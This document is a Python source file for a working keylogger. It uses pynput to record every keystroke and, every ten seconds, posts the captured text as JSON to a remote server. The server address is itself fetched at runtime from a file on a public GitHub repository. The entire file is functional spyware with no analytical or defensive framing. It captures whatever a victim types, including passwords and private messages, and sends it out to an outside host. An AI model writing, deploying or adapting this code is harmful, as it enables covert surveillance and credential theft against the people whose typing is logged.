from pynput import keyboard
import requests
import json
import threading

# Global variable to store keystrokes
text = ""

# Time interval (in seconds) to send data to the server
time_interval = 10

# Server URL - replace with your actual server address
server_url = requests.get("https://raw.githubusercontent.com/0xc18/python-keylogger/refs/heads/main/host").text

def send_post_req():
    global text
    if text.strip():  # Only send if there's data
        try:
            payload = json.dumps({"KeyboardData": text})
            headers = {"Content-Type": "application/json"}
            response = requests.post(server_url, data=payload, headers=headers)
            print(f"Server response: {response.text}")
        except Exception as e:
            print(f"Error sending request: {e}")
        finally:
            # Clear text after sending
            text = ""
    # Schedule the next call
    timer = threading.Timer(time_interval, send_post_req)
    timer.daemon = True
    timer.start()

def on_press(key):
    global text
    try:
        if key == keyboard.Key.enter:
            text += '\n'
        elif key == keyboard.Key.tab:
            text += '\t'
        elif key == keyboard.Key.space:
            text += ' '
        elif key == keyboard.Key.backspace:
            text = text[:-1]
        elif key in (keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
            pass  # Do nothing for modifier keys
        elif key == keyboard.Key.esc:
            return False  # Stop the listener
        else:
            text += str(key.char)
    except AttributeError:
        # Handle special keys that don't have a char attribute
        text += f'[{key.name}]'

if __name__ == "__main__":
    # Start the periodic sender
    send_post_req()
    # Start listening for key presses
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
